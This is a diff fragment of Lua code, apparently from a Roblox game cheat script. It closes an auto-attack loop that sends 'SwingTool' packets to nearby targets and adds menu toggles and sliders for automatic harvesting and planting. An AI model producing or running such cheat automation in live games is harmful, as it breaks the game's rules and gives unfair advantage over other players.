+					if dist < 25 and tick() - last_attack > 1/3 then
+						print("swing")
+						last_attack = tick()
+						packets.SwingTool.send({player.Character.PrimaryPart})
+					end
+				end
+			end
+		end
+	end
+end)
+
+
+
+
+
+
+
+
+-- Assuming you have defined the combat_tab:NewToggle function somewhere in your script
+
+local isRunning = false
+
+farming_tab:NewToggle({
+    Name = "Autoharvest",
+    default = true,
+    callback = function(v)
+        autoharvest = v
+    end,
+})
+
+farming_tab:NewSlider({
+    Name = "Autoharvest range",
+    min = 1,
+    max = 50,
+    default = 35,
+    callback = function(v)
+        harvest_range = v
+    end,
+})
+--raf
+farming_tab:NewToggle({
+    Name = "Autoplant",
+    default = true,
+    callback = function(v)
+        autoplant = v
+    end,
+})
+
+farming_tab:NewSlider({
+    Name = "Autoplant range",
+    min = 0,
+    max = 35,
+    default = 25,
+    callback = function(v)
+        plant_range = v
+    end,
+})
+
+farming_tab:NewDropDown({
+    Name = "Autoplant fruit",
+    options = {
+        "Bloodfruit",
+        "Berry",
+        "Bluefruit",
+        "Lemon"
+    },
+    default = "Lemon",
+    callback = function(v)
+        plant_fruit = v
+    end,
+})
+
+
+
+
+
